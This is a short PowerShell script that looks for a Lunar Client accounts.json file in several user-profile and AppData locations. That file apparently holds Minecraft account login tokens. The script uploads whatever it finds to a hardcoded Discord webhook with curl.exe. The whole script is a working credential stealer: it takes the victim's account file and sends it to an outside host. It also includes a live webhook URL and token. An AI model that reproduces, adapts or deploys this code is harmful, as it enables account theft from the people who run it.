# Discord Webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1475770175990005811/jFwwFfOqY9AlMr54QfT1B_BPeDHItn5YljgnR9FjjugrBPxKiFmLzTkg9fLrQvoN0-NX"

# Try multiple possible paths for accounts.json
$possiblePaths = @(
    "$env:USERPROFILE\.lunarclient\settings\game\accounts.json",
    "$env:APPDATA\.lunarclient\settings\game\accounts.json",
    "$env:USERPROFILE\.lunar\accounts.json",
    "$env:APPDATA\Lunar Client\accounts.json"
)

$filePath = $null
foreach ($path in $possiblePaths) {
    if (Test-Path $path) {
        $filePath = $path
        break
    }
}

if (-not $filePath) {
    Write-Host "ERROR: accounts.json not found in any known location."
    Write-Host "Searched paths:"
    foreach ($p in $possiblePaths) {
        Write-Host "  - $p"
    }
    Write-Host ""
    Write-Host "Press any key to exit..."
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}

Write-Host "Found file: $filePath"
Write-Host "Sending to Discord..."

# Use curl.exe to send
$payload = '{"content":"Here you go king :pray:"}'

$result = & curl.exe -s -X POST $webhookUrl -F "payload_json=$payload" -F "file=@$filePath"

if ($LASTEXITCODE -eq 0) {
    Write-Host "SUCCESS! File sent to Discord."
} else {
    Write-Host "FAILED. Response: $result"
}

Write-Host ""
Write-Host "Press any key to exit..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
